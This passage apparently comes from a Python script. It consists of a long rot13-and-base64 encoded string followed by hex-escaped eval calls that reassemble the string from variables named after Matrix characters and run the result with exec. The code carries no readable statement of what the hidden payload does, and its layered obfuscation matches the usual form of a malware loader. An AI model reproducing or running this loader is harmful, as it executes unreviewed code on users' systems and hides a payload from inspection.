ZzVmAQIuZmLmAwL4Awt3LGMvZmp2ZmZlAQL0ZGp5AmtmAmZ1AzL0MGH0ATH1BGLlAmp2LmLmAzH1AQD5ZmplMwZjAGR1AwZ2AzV3AwpmAmZ2AGL2ZzV3BGLkAzR2BGZ5ZmpmAGp1AGV2LGZlAwx0MQWzAmZ3ZwHjATR0ZwH4AGD0BGEwAwZ1AwZ2Amx0LmWzATD3BGLlAmLmZGp5AGL1ZQMxZzVmAGZmAmp2LwIuZmN3ZmZ0AmN2LwDmZzV1BGDlAGp0LGExZmxmZmD3ATRlLwZ4ZmH3ZQquZmtmZQp1AzH0BGp0Amx1AmH4AzRmZwLmAGHlLwHkAGtmAwZ0AmL0MQZlAwH2ZGZ5AwRlLwEvATL2AwZmA2R3LGD2AzH0BQp4AwL3AmZ0AzVlMwMzAGLlMwp5AzZmZmHjAzL2BQH4A2R1ZQZ1ATR3AQMyAGZ3AQZkAmL3AwZ0AGDmZmH3AGN0BQLmAwt0Mwp2ATZ3ZQWvAGNmZmZ1AGN1ZwZkAQV2LGMxAQLmAGD1AzVmAwZ1AQL0MGDmAQtmBQEwZmp0BQD4AQx2LGZ1ZmHmAwWzAGV1AQZ2Amp0LGWzATDmAQL2AzH1ZmH2AwZ3AmplAmxlLwL3AwV3BGMwAwZ2Lwp0Zmp1ZGquAzL2LwLlAmt0BQMyAzZ0AwDkAzR3BGZ4AGx2BGWzAmt1ZGZ0AGt2BQEzAwH0ZwZ0A2RmBQpjAmL2LmLlAQx1AQLmAGplMwL4AQD1BQMzZmLmBQH3ATV3BGquZmD3AwMvZmH2AwZ2AwL3AQMxZmV3ZwH1AQDlLwp4AGR3ZwLmAwx2AwZ1ATR2LwEvAwL2LwIuAGtmBQpkZzV0AwZ3ZmN3AGp1ATRmBQZ5AQZ3Zmp1AGZ2ZwMwZmNmZmEzATZ3Awp3AQZ2ZmpmZmV2BQEyZmZ0BGL5AQx0AQL2ZmHmZwHjAGx2AwWzATH1AmZ4ZzV3ZQIuAwL2AGD5ZmLmAGZ4AQD2LGquZmD2ZmH1AGR3Zwp2AwZ1ZGH5AQL3BGL1ZmH1AGDmZzL0AQZlZmDmZQEuAwV1ZwZ3ZmH3LGp3ZzV0LwWvAzL0MGMyAmx3AwHlAQRmBQZ5ZmR2AwEuZmD2LmL5AJRmAwWzAwH1BGZjZmtmBQZ0AzD3ZGH1AwVmBQZ1ZmZ2BGL1ZzL2MQplAmt0BGplAzL2AQZlZmV2ZmEuAmL2ZGD0ZmxmBQMy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'
zion = '\x72\x6f\x74\x31\x33'
neo = eval('\x6d\x6f\x72\x70\x68\x65\x75\x73\x20') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x74\x72\x69\x6e\x69\x74\x79\x2c\x20\x7a\x69\x6f\x6e\x29') + eval('\x6f\x72\x61\x63\x6c\x65') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6b\x65\x79\x6d\x61\x6b\x65\x72\x20\x2c\x20\x7a\x69\x6f\x6e\x29')
eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))